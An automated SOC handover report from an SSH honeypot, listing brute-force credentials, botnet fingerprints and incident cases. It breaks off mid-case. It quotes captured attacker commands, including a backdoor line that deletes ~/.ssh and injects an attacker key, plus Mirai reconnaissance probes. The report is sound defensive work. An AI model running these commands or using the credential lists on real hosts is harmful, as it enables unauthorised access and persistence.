# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-11-11 |
| **Generated At** | 2026-11-11T19:03:33Z |
| **Shift Time** | 19:03 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **429** |
| Confirmed Threats | **378** |
| False Positives Filtered | **51** (11.9%) |
| Unique Attacker IPs | **199** |
| Countries of Origin | **44** |
| High Severity Cases | **234** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **195** |
| Malware Samples Analyzed | **9** HIGH · **26** MED · 0 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **6750** |
| Unique Credential Pairs | **2202** |
| Unique Usernames | **545** |
| Unique Passwords | **1657** |
| Successful Auth Pairs | **6543** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 4706 |
| `admin` | 126 |
| `ubuntu` | 118 |
| `user` | 84 |
| `test` | 72 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `123456` | 183 |
| `wmL-o` | 56 |
| `123` | 56 |
| `1234` | 46 |
| `rootssssss23424123123` | 45 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `rootssssss23424123123` | `rootssssss23424123123` | 45 |
| `root` | `root3245gs5662d34111111111` | 38 |
| `support` | `support` | 31 |
| `admin` | `admin` | 24 |
| `root` | `admin` | 15 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `qazwsx123` | `109.160.32.48` | 2026-11-11T02:55:04 |
| `root` | `deplooyuser` | `109.160.32.48` | 2026-11-11T02:55:08 |
| `root` | `americaamerica` | `109.160.32.48` | 2026-11-11T02:55:13 |
| `root` | `udealpassword` | `109.160.32.48` | 2026-11-11T02:55:18 |
| `root` | `paria` | `109.160.32.48` | 2026-11-11T02:55:21 |
| `root` | `fQZtXYsY2sRmQG6s0Q7K` | `109.160.32.48` | 2026-11-11T02:55:26 |
| `root` | `12345678#` | `109.160.32.48` | 2026-11-11T02:55:30 |
| `root` | `Plc@123456` | `109.160.32.48` | 2026-11-11T02:55:35 |
| `root` | `12345` | `80.94.92.234` | 2026-11-11T02:55:37 |
| `root` | `CBVjnd174` | `109.160.32.48` | 2026-11-11T02:55:40 |
| `ubuntu` | `12345678` | `109.160.32.48` | 2026-11-11T02:55:44 |
| `root` | `Xiang123` | `109.160.32.48` | 2026-11-11T02:55:48 |
| `root` | `ImprovvisoTriton1!` | `109.160.32.48` | 2026-11-11T02:55:53 |
| `root` | `Manga@2026` | `109.160.32.48` | 2026-11-11T02:55:58 |
| `cactiuser` | `artinuscactiuser` | `109.160.32.48` | 2026-11-11T02:56:02 |
| `root` | `i#g6Of17gY5Kkbi5` | `109.160.32.48` | 2026-11-11T02:56:06 |
| `root` | `root.123qwe` | `109.160.32.48` | 2026-11-11T02:56:11 |
| `root` | `xXXcbjKVF7fwIHf-orpuv_5bzUmmoSK6` | `109.160.32.48` | 2026-11-11T02:56:15 |
| `root` | `qwertyuiop` | `109.160.32.48` | 2026-11-11T02:56:19 |
| `root` | `chang` | `109.160.32.48` | 2026-11-11T02:56:24 |
_… 6523 more successful pair(s) in credentials.json_

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **429** |
| Sessions with Fingerprint | **25** |
| Unique HASSH Fingerprints | **25** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 173 |
| libssh | 49 |
| OpenSSH | 6 |
| Unknown | 5 |
| AsyncSSH (Python) | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `2ec37a7cc8da...` | Mirai/variant | 113 | 4 |
| `f555226df196...` | Mirai/variant | 45 | 24 |
| `0a07365cc01f...` | Generic scanner | 19 | 8 |
| `eff4c24daffc...` | Modern SSH client | 9 | 1 |
| `16443846184e...` | Generic scanner | 8 | 6 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `2ec37a7cc8da...` | Go SSH scanner | 113 | 4 | Mirai/variant |
| `f555226df196...` | libssh | 45 | 24 | Mirai/variant |
| `0a07365cc01f...` | Go SSH scanner | 19 | 8 | Generic scanner |
| `eff4c24daffc...` | Go SSH scanner | 9 | 1 | Modern SSH client |
| `16443846184e...` | Go SSH scanner | 8 | 6 | Generic scanner |
| `084386fa7ae5...` | Go SSH scanner | 6 | 6 | Mirai/variant |
| `95420f9d932d...` | OpenSSH | 6 | 6 | — |
| `a289c065bf37...` | Go SSH scanner | 5 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **125** |
| Campaign Clusters | **3** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1083, T1082, T1592, T1105` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1059.004, T1082, T1592, T1140` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 40 | 22 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
enable
```
```
linuxshell
```
```
system
```
```
sh
```
```
ls /home; /bin/busybox BOTNET
```
Source IPs: `172.86.85.110`

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
echo SHELL_TEST
```
```
cat /proc/cpuinfo
```
```
uname -m
```
```
dd if=/bin/busybox bs=1 count=40 2>/dev/null | od -A n -t x1 | tr -d ' \n' || dd if=/bin/sh bs=1 count=40 2>/dev/null | od -A n -t x1 | tr -d ' \n'
```
```
file /bin/busybox 2>/dev/null || file /bin/sh 2>/dev/null
```
Source IPs: `180.93.193.100`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `121.242.232.147`, `81.192.46.49`, `150.139.201.247`, `119.255.245.44`, `103.88.76.27`, `192.169.232.223`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **199** |
| Unique ASNs | **98** |
| High-Risk ASNs | **74** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS0` |  | 57 | HIGH |
| `AS398324` | Censys, Inc. | 7 | HIGH |
| `AS15169` | Google LLC | 6 | HIGH |
| `AS8075` | Microsoft Corporation | 6 | HIGH |
| `AS4766` | Korea Telecom | 5 | HIGH |
| `AS4134` | CHINANET BACKBONE | 4 | HIGH |
| `AS396982` | Google LLC | 4 | LOW |
| `AS14061` | DigitalOcean, LLC | 4 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (227)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-e269c282e8c7

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]48` |
| **First Seen** | 2026-11-11 02:55 |
| **Last Seen** | 2026-11-11 02:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-11 02:55:08` | `cowrie.session.connect` |
| `2026-11-11 02:55:08` | `cowrie.client.version` |
| `2026-11-11 02:55:08` | `cowrie.client.kex` |
| `2026-11-11 02:55:08` | `cowrie.login.success` |
| `2026-11-11 02:55:09` | `cowrie.session.params` |
| `2026-11-11 02:55:09` | `cowrie.command.input` |
| `2026-11-11 02:55:09` | `cowrie.log.closed` |
| `2026-11-11 02:55:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]48` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]48` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d6c836713990

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-11-11 02:55 |
| **Last Seen** | 2026-11-11 02:55 |
| **Session Duration** | 20s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_9f2d0057a510ed56bdfe3fdf283cc6b1_small_control'"'"' '"'"'check_9f2d0057a510ed56bdfe3fdf283cc6b1'"'"'', printf '\n%s|%s\n' 'check_9f2d0057a510ed56bdfe3fdf283cc6b1_small_control' 'check_9f2d0057a510ed56bdfe3fdf283cc6b1', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_9f2d0057a510ed56bdfe3fdf283cc6b1_small_math'"'"' "$((870*88+10))"', (870*88+10, printf '\n%s|%s\n' 'check_9f2d0057a510ed56bdfe3fdf283cc6b1_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-11 02:55:30` | `cowrie.session.connect` |
| `2026-11-11 02:55:31` | `cowrie.client.version` |
| `2026-11-11 02:55:31` | `cowrie.client.kex` |
| `2026-11-11 02:55:37` | `cowrie.login.success` |
| `2026-11-11 02:55:41` | `cowrie.client.size` |
| `2026-11-11 02:55:42` | `cowrie.session.params` |
| `2026-11-11 02:55:44` | `cowrie.command.input` |
| `2026-11-11 02:55:44` | `cowrie.command.input` |
| `2026-11-11 02:55:44` | `cowrie.command.input` |
| `2026-11-11 02:55:44` | `cowrie.command.input` |
| `2026-11-11 02:55:44` | `cowrie.command.input` |
| `2026-11-11 02:55:44` | `cowrie.command.input` |
| `2026-11-11 02:55:44` | `cowrie.command.input` |
| `2026-11-11 02:55:44` | `cowrie.command.input` |
| `2026-11-11 02:55:44` | `cowrie.command.input` |
| … | _47 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-86e826b7dbfe

| Field | Detail |
|---|---|
| **Source IP** | `169.211.128[.]234` |
| **First Seen** | 2026-11-11 02:58 |
| **Last Seen** | 2026-11-11 02:59 |
| **Session Duration** | 34s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `zalee, za, &k`g&k|zpkfq)ES[M, g & k | zpkfq` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-11 02:58:48` | `cowrie.session.connect` |
| `2026-11-11 02:58:49` | `cowrie.login.success` |
| `2026-11-11 02:58:49` | `cowrie.login.success` |
| `2026-11-11 02:58:50` | `cowrie.session.params` |
| `2026-11-11 02:58:50` | `cowrie.command.input` |
| `2026-11-11 02:58:50` | `cowrie.command.failed` |
| `2026-11-11 02:58:51` | `cowrie.command.input` |
| `2026-11-11 02:58:51` | `cowrie.command.failed` |
| `2026-11-11 02:58:52` | `cowrie.command.input` |
| `2026-11-11 02:58:52` | `cowrie.command.input` |
| `2026-11-11 02:58:52` | `cowrie.command.failed` |
| `2026-11-11 02:58:52` | `cowrie.command.failed` |
| `2026-11-11 02:59:22` | `cowrie.log.closed` |
| `2026-11-11 02:59:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `169.211.128[.]234` to AbuseIPDB if not already reported
- [ ] Block `169.211.128[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-89780f8f48d2

| Field | Detail |
|---|---|
| **Source IP** | `172.86.85[.]110` |
| **First Seen** | 2026-11-11 03:00 |
| **Last Seen** | 2026-11-11 03:00 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `enable, linuxshell, system, sh, ls /home; /bin/busybox BOTNET` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-11 03:00:42` | `cowrie.session.connect` |
| `2026-11-11 03:00:43` | `cowrie.login.success` |
| `2026-11-11 03:00:43` | `cowrie.session.params` |
| `2026-11-11 03:00:43` | `cowrie.command.input` |
| `2026-11-11 03:00:43` | `cowrie.command.failed` |
| `2026-11-11 03:00:43` | `cowrie.command.input` |
| `2026-11-11 03:00:43` | `cowrie.command.failed` |
| `2026-11-11 03:00:43` | `cowrie.command.input` |
| `2026-11-11 03:00:43` | `cowrie.command.failed` |
| `2026-11-11 03:00:43` | `cowrie.command.input` |
| `2026-11-11 03:00:43` | `cowrie.command.input` |
| `2026-11-11 03:00:43` | `cowrie.command.input` |
| `2026-11-11 03:00:58` | `cowrie.log.closed` |
| `2026-11-11 03:00:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.86.85[.]110` to AbuseIPDB if not already reported
- [ ] Block `172.86.85[.]110` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-287bf8696bd3

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-11-11 03:01 |
| **Last Seen** | 2026-11-11 03:01 |
| **Session Duration** | 33s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_ae0323b74cba1c98ccf587c744155f5b_small_control'"'"' '"'"'check_ae0323b74cba1c98ccf587c744155f5b'"'"'', printf '\n%s|%s\n' 'check_ae0323b74cba1c98ccf587c744155f5b_small_control' 'check_ae0323b74cba1c98ccf587c744155f5b', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_ae0323b74cba1c98ccf587c744155f5b_small_math'"'"' "$((680*225+25))"', (680*225+25, printf '\n%s|%s\n' 'check_ae0323b74cba1c98ccf587c744155f5b_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-11 03:01:08` | `cowrie.session.connect` |
| `2026-11-11 03:01:11` | `cowrie.client.version` |
| `2026-11-11 03:01:11` | `cowrie.client.kex` |
| `2026-11-11 03:01:22` | `cowrie.login.success` |
| `2026-11-11 03:01:27` | `cowrie.client.size` |
| `2026-11-11 03:01:30` | `cowrie.session.params` |
| `2026-11-11 03:01:32` | `cowrie.command.input` |
| `2026-11-11 03:01:32` | `cowrie.command.input` |
| `2026-11-11 03:01:32` | `cowrie.command.input` |
| `2026-11-11 03:01:32` | `cowrie.command.input` |
| `2026-11-11 03:01:32` | `cowrie.command.input` |
| `2026-11-11 03:01:32` | `cowrie.command.input` |
| `2026-11-11 03:01:32` | `cowrie.command.input` |
| `2026-11-11 03:01:32` | `cowrie.command.input` |
| `2026-11-11 03:01:32` | `cowrie.command.input` |
| … | _47 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a4959e0328c

| Field | Detail |
|---|---|
| **Source IP** | `169.211.128[.]234` |
| **First Seen** | 2026-11-11 03:02 |
| **Last Seen** | 2026-11-11 03:02 |
| **Session Duration** | 34s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `lghkel, zpz}ld, zalee, za, &k`g&k|zpkfq)ES[M` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-11 03:02:16` | `cowrie.session.connect` |
| `2026-11-11 03:02:18` | `cowrie.login.success` |
| `2026-11-11 03:02:18` | `cowrie.session.params` |
| `2026-11-11 03:02:19` | `cowrie.command.input` |
| `2026-11-11 03:02:19` | `cowrie.command.failed` |
| `2026-11-11 03:02:19` | `cowrie.command.input` |
| `2026-11-11 03:02:19` | `cowrie.command.failed` |
| `2026-11-11 03:02:19` | `cowrie.command.input` |
| `2026-11-11 03:02:19` | `cowrie.command.failed` |
| `2026-11-11 03:02:20` | `cowrie.command.input` |
| `2026-11-11 03:02:20` | `cowrie.command.failed` |
| `2026-11-11 03:02:20` | `cowrie.command.input` |
| `2026-11-11 03:02:20` | `cowrie.command.input` |
| `2026-11-11 03:02:20` | `cowrie.command.failed` |
| `2026-11-11 03:02:20` | `cowrie.command.failed` |
| … | _2 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `169.211.128[.]234` to AbuseIPDB if not already reported
- [ ] Block `169.211.128[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c6a793936585

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-11-11 03:04 |
| **Last Seen** | 2026-11-11 03:04 |
| **Session Duration** | 23s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_10db4bf5cad00df4e97f9ff1763f7e56_small_control'"'"' '"'"'check_10db4bf5cad00df4e97f9ff1763f7e56'"'"'', printf '\n%s|%s\n' 'check_10db4bf5cad00df4e97f9ff1763f7e56_small_control' 'check_10db4bf5cad00df4e97f9ff1763f7e56', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_10db4bf5cad00df4e97f9ff1763f7e56_small_math'"'"' "$((328*617+48))"', (328*617+48, printf '\n%s|%s\n' 'check_10db4bf5cad00df4e97f9ff1763f7e56_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-11 03:04:05` | `cowrie.session.connect` |
| `2026-11-11 03:04:06` | `cowrie.client.version` |
| `2026-11-11 03:04:06` | `cowrie.client.kex` |
| `2026-11-11 03:04:09` | `cowrie.login.success` |
| `2026-11-11 03:04:14` | `cowrie.client.size` |
| `2026-11-11 03:04:16` | `cowrie.session.params` |
| `2026-11-11 03:04:18` | `cowrie.command.input` |
| `2026-11-11 03:04:18` | `cowrie.command.input` |
| `2026-11-11 03:04:18` | `cowrie.command.input` |
| `2026-11-11 03:04:18` | `cowrie.command.input` |
| `2026-11-11 03:04:18` | `cowrie.command.input` |
| `2026-11-11 03:04:18` | `cowrie.command.input` |
| `2026-11-11 03:04:18` | `cowrie.command.input` |
| `2026-11-11 03:04:18` | `cowrie.command.input` |
| `2026-11-11 03:04:18` | `cowrie.command.input` |
| … | _47 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c50a8deeb0cc

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-11-11 03:06 |
| **Last Seen** | 2026-11-11 03:07 |
| **Session Duration** | 47s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_c2bf8cc532bdab376e29f23ea7e71d5b_small_control'"'"' '"'"'check_c2bf8cc532bdab376e29f23ea7e71d5b'"'"'', printf '\n%s|%s\n' 'check_c2bf8cc532bdab376e29f23ea7e71d5b_small_control' 'check_c2bf8cc532bdab376e29f23ea7e71d5b', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_c2bf8cc532bdab376e29f23ea7e71d5b_small_math'"'"' "$((6*362+95))"', (6*362+95, printf '\n%s|%s\n' 'check_c2bf8cc532bdab376e29f23ea7e71d5b_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-11 03:06:41` | `cowrie.session.connect` |
| `2026-11-11 03:06:43` | `cowrie.client.version` |
| `2026-11-11 03:06:43` | `cowrie.client.kex` |
| `2026-11-11 03:06:58` | `cowrie.login.success` |
| `2026-11-11 03:07:15` | `cowrie.client.size` |
| `2026-11-11 03:07:16` | `cowrie.session.params` |
| `2026-11-11 03:07:17` | `cowrie.command.input` |
| `2026-11-11 03:07:17` | `cowrie.command.input` |
| `2026-11-11 03:07:17` | `cowrie.command.input` |
| `2026-11-11 03:07:17` | `cowrie.command.input` |
| `2026-11-11 03:07:17` | `cowrie.command.input` |
| `2026-11-11 03:07:17` | `cowrie.command.input` |
| `2026-11-11 03:07:17` | `cowrie.command.input` |
| `2026-11-11 03:07:17` | `cowrie.command.input` |
| `2026-11-11 03:07:17` | `cowrie.command.input` |
| … | _26 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5132de73a2a2

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-11-11 03:09 |
| **Last Seen** | 2026-11-11 03:09 |
| **Session Duration** | 26s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_016e54650d8f91eedecc64f1c83f0085_small_control'"'"' '"'"'check_016e54650d8f91eedecc64f1c83f0085'"'"'', printf '\n%s|%s\n' 'check_016e54650d8f91eedecc64f1c83f0085_small_control' 'check_016e54650d8f91eedecc64f1c83f0085', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_016e54650d8f91eedecc64f1c83f0085_small_math'"'"' "$((367*795+76))"', (367*795+76, printf '\n%s|%s\n' 'check_016e54650d8f91eedecc64f1c83f0085_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-11 03:09:25` | `cowrie.session.connect` |
| `2026-11-11 03:09:26` | `cowrie.client.version` |
| `2026-11-11 03:09:26` | `cowrie.client.kex` |
| `2026-11-11 03:09:33` | `cowrie.login.success` |
| `2026-11-11 03:09:38` | `cowrie.client.size` |
| `2026-11-11 03:09:41` | `cowrie.session.params` |
| `2026-11-11 03:09:43` | `cowrie.command.input` |
| `2026-11-11 03:09:43` | `cowrie.command.input` |
| `2026-11-11 03:09:43` | `cowrie.command.input` |
| `2026-11-11 03:09:43` | `cowrie.command.input` |
| `2026-11-11 03:09:43` | `cowrie.command.input` |
| `2026-11-11 03:09:43` | `cowrie.command.input` |
| `2026-11-11 03:09:43` | `cowrie.command.input` |
| `2026-11-11 03:09:43` | `cowrie.command.input` |
| `2026-11-11 03:09:43` | `cowrie.command.input` |
| … | _47 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-74381764abd2

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-11-11 03:12 |
| **Last Seen** | 2026-11-11 03:12 |
| **Session Duration** | 26s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_f1b17a4989b95d3e03f7256fb3982f37_small_control'"'"' '"'"'check_f1b17a4989b95d3e03f7256fb3982f37'"'"'', printf '\n%s|%s\n' 'check_f1b17a4989b95d3e03f7256fb3982f37_small_control' 'check_f1b17a4989b95d3e03f7256fb3982f37', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_f1b17a4989b95d3e03f7256fb3982f37_small_math'"'"' "$((60*585+85))"', (60*585+85, printf '\n%s|%s\n' 'check_f1b17a4989b95d3e03f7256fb3982f37_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-11 03:12:04` | `cowrie.session.connect` |
| `2026-11-11 03:12:04` | `cowrie.client.version` |
| `2026-11-11 03:12:04` | `cowrie.client.kex` |
| `2026-11-11 03:12:09` | `cowrie.login.success` |
| `2026-11-11 03:12:20` | `cowrie.client.size` |
| `2026-11-11 03:12:23` | `cowrie.session.params` |
| `2026-11-11 03:12:24` | `cowrie.command.input` |
| `2026-11-11 03:12:24` | `cowrie.command.input` |
| `2026-11-11 03:12:24` | `cowrie.command.input` |
| `2026-11-11 03:12:24` | `cowrie.command.input` |
| `2026-11-11 03:12:24` | `cowrie.command.input` |
| `2026-11-11 03:12:24` | `cowrie.command.input` |
| `2026-11-11 03:12:24` | `cowrie.command.input` |
| `2026-11-11 03:12:24` | `cowrie.command.input` |
| `2026-11-11 03:12:24` | `cowrie.command.input` |
| … | _47 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6633d9cf7397

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-11-11 03:14 |
| **Last Seen** | 2026-11-11 03:14 |
| **Session Duration** | 24s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_6333d3e433d5470de3dfc324adf33eee_small_control'"'"' '"'"'check_6333d3e433d5470de3dfc324adf33eee'"'"'', printf '\n%s|%s\n' 'check_6333d3e433d5470de3dfc324adf33eee_small_control' 'check_6333d3e433d5470de3dfc324adf33eee', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_6333d3e433d5470de3dfc324adf33eee_small_math'"'"' "$((471*731+79))"', (471*731+79, printf '\n%s|%s\n' 'check_6333d3e433d5470de3dfc324adf33eee_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-11 03:14:22` | `cowrie.session.connect` |
| `2026-11-11 03:14:24` | `cowrie.client.version` |
| `2026-11-11 03:14:24` | `cowrie.client.kex` |
| `2026-11-11 03:14:31` | `cowrie.login.success` |
| `2026-11-11 03:14:34` | `cowrie.client.size` |
| `2026-11-11 03:14:38` | `cowrie.session.params` |
| `2026-11-11 03:14:39` | `cowrie.command.input` |
| `2026-11-11 03:14:39` | `cowrie.command.input` |
| `2026-11-11 03:14:39` | `cowrie.command.input` |
| `2026-11-11 03:14:39` | `cowrie.command.input` |
| `2026-11-11 03:14:39` | `cowrie.command.input` |
| `2026-11-11 03:14:39` | `cowrie.command.input` |
| `2026-11-11 03:14:39` | `cowrie.command.input` |
| `2026-11-11 03:14:39` | `cowrie.command.input` |
| `2026-11-11 03:14:39` | `cowrie.command.input` |
| … | _47 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-87d863cf8e4a

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-11-11 03:16 |
| **Last Seen** | 2026-11-11 03:16 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
